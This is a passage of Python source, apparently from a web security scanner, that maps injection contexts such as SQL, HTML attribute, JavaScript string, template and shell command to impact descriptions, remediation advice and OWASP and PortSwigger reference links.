                "SQL injection allows an attacker to read, modify, or delete "
                "database contents. In severe cases, this leads to authentication "
                "bypass, data exfiltration of all user records, or remote code "
                "execution via SQL-specific functions (xp_cmdshell, LOAD_FILE)."
            ),
            InjectionContext.SQL_STRING_DOUBLE: (
                "SQL injection via double-quoted string. Same impact as single-quote "
                "SQLi: full database access, authentication bypass, data exfiltration."
            ),
            InjectionContext.SQL_NUMERIC: (
                "Numeric SQL injection — no quote escaping needed. Allows boolean-based "
                "data extraction and potentially time-based blind enumeration of "
                "the entire database."
            ),
            InjectionContext.HTML_TAG_BODY: (
                "HTML injection in tag body allows arbitrary tag insertion including "
                "<script> for stored/reflected XSS. An attacker can steal session "
                "tokens, perform actions as the victim, or redirect to phishing pages."
            ),
            InjectionContext.HTML_ATTRIBUTE_QUOTED: (
                "HTML attribute injection — attacker can break out of the attribute "
                "and inject event handlers (onmouseover, onfocus) for XSS. "
                "Impact: session hijacking, credential theft, account takeover."
            ),
            InjectionContext.HTML_ATTRIBUTE_UNQUOTED: (
                "Unquoted HTML attribute injection — trivially exploitable XSS via "
                "event handler injection. No quote breakout needed."
            ),
            InjectionContext.JS_STRING_SINGLE: (
                "JavaScript string injection — attacker can break out of the string "
                "and execute arbitrary JavaScript. Impact: full DOM access, "
                "session theft, keylogging, cryptocurrency mining."
            ),
            InjectionContext.JS_STRING_DOUBLE: (
                "JavaScript double-quoted string injection. Same impact as single-quote "
                "JS injection: arbitrary script execution in victim's browser."
            ),
            InjectionContext.TEMPLATE_ENGINE: (
                "Server-Side Template Injection (SSTI) — attacker can execute "
                "arbitrary code on the server. Impact: Remote Code Execution (RCE), "
                "full server compromise, lateral movement within the network."
            ),
            InjectionContext.SHELL_COMMAND: (
                "OS Command Injection — attacker can execute arbitrary system commands. "
                "Impact: full server compromise, data exfiltration, pivot to internal "
                "network, cryptocurrency mining, ransomware deployment."
            ),
        }
        return impacts.get(ctx, "Injection vulnerability with potential for unauthorized access or data leakage.")

    @staticmethod
    def _remediation_for_context(ctx: InjectionContext) -> str:
        remediations = {
            InjectionContext.SQL_STRING_SINGLE: (
                "Use parameterized queries (prepared statements) for ALL database access. "
                "Never concatenate user input into SQL strings. Apply input validation "
                "as defense-in-depth but NEVER as primary protection."
            ),
            InjectionContext.SQL_STRING_DOUBLE: "Use parameterized queries. Never concatenate user input into SQL.",
            InjectionContext.SQL_NUMERIC: "Use parameterized queries with proper type casting.",
            InjectionContext.HTML_TAG_BODY: (
                "Apply context-aware output encoding. Use HTML entity encoding for "
                "user input in HTML body. Implement Content-Security-Policy with "
                "strict-dynamic or nonce-based script execution."
            ),
            InjectionContext.HTML_ATTRIBUTE_QUOTED: (
                "HTML-encode user input placed in attributes. Use quoted attributes "
                "and encode the matching quote character. Consider CSP as defense-in-depth."
            ),
            InjectionContext.HTML_ATTRIBUTE_UNQUOTED: "Always quote HTML attributes and encode user input.",
            InjectionContext.JS_STRING_SINGLE: (
                "JavaScript-encode user input placed in JS strings. Prefer using "
                "data attributes and DOM APIs instead of inline script interpolation."
            ),
            InjectionContext.JS_STRING_DOUBLE: "JavaScript-encode user input. Avoid inline script interpolation.",
            InjectionContext.TEMPLATE_ENGINE: (
                "Sandbox the template engine. Never pass user input directly into "
                "template expressions. Use a logic-less template engine (Mustache) "
                "or enable strict auto-escaping."
            ),
            InjectionContext.SHELL_COMMAND: (
                "Never pass user input to shell commands. Use language-native APIs "
                "instead of spawning shells. If unavoidable, use strict allowlist "
                "validation and parameterized command execution."
            ),
        }
        return remediations.get(ctx, "Apply context-appropriate input validation and output encoding.")

    @staticmethod
    def _references_for_context(ctx: InjectionContext) -> List[str]:
        base_refs = ["https://portswigger.net/research/backslash-powered-scanning"]
        context_refs = {
            InjectionContext.SQL_STRING_SINGLE: [
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://portswigger.net/web-security/sql-injection",
            ],
            InjectionContext.HTML_TAG_BODY: [
                "https://owasp.org/www-community/attacks/xss/",
                "https://portswigger.net/web-security/cross-site-scripting",
            ],
            InjectionContext.TEMPLATE_ENGINE: [
                "https://portswigger.net/web-security/server-side-template-injection",
            ],
            InjectionContext.SHELL_COMMAND: [
                "https://owasp.org/www-community/attacks/Command_Injection",
            ],
        }
        return base_refs + context_refs.get(ctx, [])
